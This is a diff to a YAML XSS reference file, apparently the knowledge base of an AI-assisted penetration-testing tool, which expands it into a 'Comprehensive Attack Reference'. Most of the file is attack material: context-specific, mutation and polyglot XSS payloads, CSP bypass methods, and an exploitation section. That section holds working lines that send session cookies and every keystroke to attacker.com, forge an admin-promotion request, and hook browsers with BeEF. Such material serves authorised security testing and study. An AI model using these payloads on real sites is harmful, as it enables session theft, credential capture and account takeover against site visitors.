@@ -1,79 +1,113 @@
 id: XSS
-name: Cross-Site Scripting
+name: Cross-Site Scripting — Comprehensive Attack Reference
 cwe:
 - CWE-79
 owasp: A03:2021 Injection
-severity_range: Medium - High
-description: User input is reflected or stored in HTML output without proper encoding, allowing execution of arbitrary JavaScript
-  in victims' browsers.
+severity_range: Medium - Critical
+description: 'XSS occurs when user input is rendered in a browser context without proper encoding. Three classes: reflected
+  (immediate execution), stored (persistent), and DOM-based (client-side only). Each context (HTML body, attribute, JavaScript,
+  CSS, URL) requires different payload syntax. Modern XSS requires CSP bypass, framework-specific knowledge, and increasingly
+  sophisticated polyglot payloads.'
 detection:
-  payloads:
-    reflected_basic:
+  strategy:
+  - 1. Submit unique marker (MANTIS-PROBE-12345) in each parameter
+  - '2. Identify reflection contexts: HTML body, attribute, script, comment, CSS, URL'
+  - 3. Try context-appropriate payloads
+  - '4. For stored: submit payload, visit all pages that render that field'
+  - '5. For DOM: analyze JavaScript for sinks (innerHTML, document.write, eval)'
+  - 6. Test CSP via response headers; identify bypass paths
+  - 7. For blind XSS, use OOB callback (admin panel will trigger it)
+  payloads_by_context:
+    html_body:
     - <script>alert(1)</script>
     - <img src=x onerror=alert(1)>
     - <svg onload=alert(1)>
-    - '"><script>alert(1)</script>'
-    - '''-alert(1)-'''
+    - <iframe src=javascript:alert(1)>
     - <body onload=alert(1)>
-    - <input onfocus=alert(1) autofocus>
-    - <marquee onstart=alert(1)>
+    - <input autofocus onfocus=alert(1)>
     - <details open ontoggle=alert(1)>
-    - <video src=x onerror=alert(1)>
-    attribute_context:
-    - '" onfocus=alert(1) autofocus="'
-    - ''' onfocus=alert(1) autofocus='''
-    - '" onmouseover=alert(1) "'
+    attribute:
+    - '" onmouseover=alert(1) x="'
+    - ''' onfocus=alert(1) autofocus x='''
     - javascript:alert(1)
-    - '" style="background:url(javascript:alert(1))"'
+    - '"><script>alert(1)</script>'
     javascript_context:
-    - ''';alert(1)//'
-    - '";alert(1)//'
-    - \';alert(1)//
+    - ''';alert(1);//'
+    - \';alert(1);//
     - </script><script>alert(1)</script>
-    - '''-alert(1)-'''
-    - \x3cscript\x3ealert(1)\x3c/script\x3e
-    dom_based:
-    - '#<img src=x onerror=alert(1)>'
-    - javascript:alert(document.domain)
+    - ${alert(1)}
+    - '`+alert(1)+`'
+    url_context:
+    - javascript:alert(1)
     - data:text/html,<script>alert(1)</script>
+    - data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+    css_context:
+    - expression(alert(1))
+    - url(javascript:alert(1))
+    - '@import ''http://attacker.com/x.css'''
+  attack_classes:
+    reflected:
+      description: Payload in request immediately reflected in response.
+      exploitation: Send victim a crafted URL; payload executes when they visit.
+      severity: high
+    stored:
+      description: Payload stored server-side, executes for every viewer.
+      exploitation: Submit payload to comment/profile/forum; every visitor compromised.
+      severity: critical
+    dom_based:
+      description: Payload never touches server — sink in client-side JS.
+      exploitation: Find sources (location.hash, postMessage, document.cookie) flowing to sinks (innerHTML, eval).
+      severity: high
+    blind:
+      description: Payload executes in a context attacker can't observe (admin panel).
+      exploitation: Use OOB callback with fetch() to exfiltrate cookies/data.
+      severity: high
+    self_xss:
+      description: XSS that only fires in attacker's own session — useless alone, useful chained with CSRF.
+      exploitation: Force victim to paste payload (clickjacking, social engineering).
+      severity: low
+    mutation_xss:
+      description: Innerhtml mutates payload during parsing into executable form.
+      techniques:
+      - <noscript><p title='</noscript><img src=x onerror=alert(1)>'>
+      - <svg><a><animate attributeName=href values=javascript:alert(1) /><text>click</text></a>
+      severity: high
     polyglot:
-    - jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0teleport0teleport%0teleport%0a%0d%0aon*/teleport/<svg/onload=alert()//
-    - '"><img src=x onerror=alert(1)>'
-    - '''-alert(1)-'''
-    filter_bypass:
-    - <scr<script>ipt>alert(1)</scr</script>ipt>
-    - <ScRiPt>alert(1)</ScRiPt>
-    - <img src=x oNeRrOr=alert(1)>
-    - <svg/onload=alert(1)>
-    - <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
-    - \u003cscript\u003ealert(1)\u003c/script\u003e
-  strategy:
-  - 1. Inject a unique canary string (e.g., mantis12345) in every input
-  - 2. Search the response for the canary to find reflection points
-  - '3. Determine the context: HTML body, attribute, JavaScript, URL, CSS'
-  - 4. Craft context-appropriate payloads
-  - 5. Test for DOM-based XSS by checking client-side JavaScript sinks
-  - 6. Test stored XSS by submitting payloads and checking other pages
-  - 7. Check for CSP headers and test bypasses if present
-  - 8. Test HTTP response headers for header injection leading to XSS
-escalation:
-  session_hijacking: 'Use XSS to steal session cookies: new Image().src=''http://attacker.com/?c=''+document.cookie'
-  keylogging: Inject a keylogger to capture credentials on login pages
-  phishing: Replace page content with a fake login form
-  csrf_via_xss: Use XSS to perform authenticated actions on behalf of the victim
-  worm: Self-propagating XSS worm via stored XSS in social features
-evidence_needed: Payload reflected/stored in response and executable in browser context. Screenshot or DOM evidence showing
-  script execution.
+      description: Payload works in multiple contexts simultaneously.
+      techniques:
+      - 'javascript:/*--></title></style></textarea></script></xmp>
+
+        <svg/onload=alert(1)>'
+      - jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//\x3e
+      severity: high
+exploitation:
+  session_theft: fetch('//attacker.com/?c='+document.cookie)
+  keylogging: document.onkeypress = e => fetch('//attacker.com/?k='+e.key)
+  csrf_via_xss: fetch('/api/admin/promote', {method:'POST', body:JSON.stringify({user:'attacker'})})
+  credential_harvest: Inject fake login overlay; capture entered credentials
+  browser_exploitation: BeEF framework hook for full browser control
+  internal_network_scan: Use XHR to probe internal IPs (192.168.x, 10.x) from victim's browser
+csp_bypass:
+- 'If CSP allows unsafe-inline: trivial bypass'
+- 'If CSP allows specific domains: find JSONP or AngularJS in those domains'
+- 'If CSP allows nonce: leak the nonce via DOM clobbering or dangling markup'
+- 'If CSP uses strict-dynamic: find a way to inject into existing script-loaded JS'
+- 'Base-uri bypass: <base href=''https://attacker.com''> then load relative scripts'
+- 'iframe sandbox abuse: srcdoc bypasses parent CSP'
 ai_research_hints:
-- Analyze the application's sanitization library and find bypass vectors
-- Check for mutation XSS (mXSS) via innerHTML or DOMParser
-- Test postMessage handlers for DOM-based XSS
-- Check template engines for client-side template injection (AngularJS, Vue.js)
-- Look for JSONP endpoints that can be used for XSS
-- Test SVG upload for stored XSS via SVG files
+- DOM XSS is invisible to server-side scanners — must analyze JS
+- Stored XSS often hides in admin-only views (ticket comments, audit logs)
+- 'Framework XSS: Angular {{constructor.constructor(''alert(1)'')()}}, Vue, React dangerouslySetInnerHTML'
+- PDF/CSV/Excel export features often render user content unsafely
+- Test in old IE/Edge for HTML parser differentials
+- Check Trusted Types policies if CSP is strong — clobbering may bypass them
+evidence_needed: Demonstrate JavaScript execution (alert/console/fetch) in the target's origin context.
+tools:
+- XSS Hunter
+- OOB callback (blind XSS)
+- browser devtools
+- BeEF
 references:
 - https://portswigger.net/web-security/cross-site-scripting
-- https://owasp.org/www-community/attacks/xss/
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
-- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
-- https://html5sec.org/
+- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
